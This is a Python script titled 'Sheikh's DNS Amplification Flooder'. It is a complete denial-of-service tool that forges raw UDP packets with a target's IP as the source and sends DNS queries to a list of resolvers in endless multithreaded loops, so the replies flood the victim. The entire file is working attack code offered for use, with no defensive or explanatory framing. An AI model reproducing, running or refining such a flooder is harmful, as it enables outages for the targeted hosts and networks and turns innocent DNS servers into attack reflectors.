#!/usr/bin/env python3
import random
import socket
import threading
import struct
import os

print("\033[91m")
print("###############################################")
print("#        Sheikh's DNS Amplification Flooder   #")
print("###############################################")
print("\033[0m")

dns_query = (
    b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    b"\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00"
    b"\x00\x01\x00\x01"
)

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = data[i] + (data[i+1] << 8)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def build_packet(src_ip, dst_ip, src_port, dst_port, payload):
    iph = struct.pack(
        '!BBHHHBBH4s4s',
        0x45, 0,
        20 + 8 + len(payload),
        random.randint(0, 65535),
        0,
        64,
        socket.IPPROTO_UDP,
        0,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip)
    )
    udph = struct.pack(
        '!HHHH',
        src_port,
        dst_port,
        8 + len(payload),
        0
    )
    psh = struct.pack(
        '!4s4sBBH',
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0,
        socket.IPPROTO_UDP,
        8 + len(payload)
    )
    udp_checksum = checksum(psh + udph + payload)
    udph = struct.pack(
        '!HHHH',
        src_port,
        dst_port,
        8 + len(payload),
        udp_checksum
    )
    packet = iph + udph + payload
    return packet

def flood(target_ip, dns_server):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    src_port = random.randint(1024, 65535)
    while True:
        pkt = build_packet(target_ip, dns_server, src_port, 53, dns_query)
        try:
            sock.sendto(pkt, (dns_server, 53))
        except:
            pass

def load_dns(file):
    try:
        with open(file, "r") as f:
            return [x.strip() for x in f if x.strip()]
    except:
        return []

if __name__ == "__main__":
    file = input("DNS server list: ")
    dns = load_dns(file)
    if not dns:
        print("No DNS servers loaded.")
        exit()

    target = input("Target IP: ")
    threads = int(input("Threads: "))

    for _ in range(threads):
        server = random.choice(dns)
        t = threading.Thread(target=flood, args=(target, server))
        t.start()
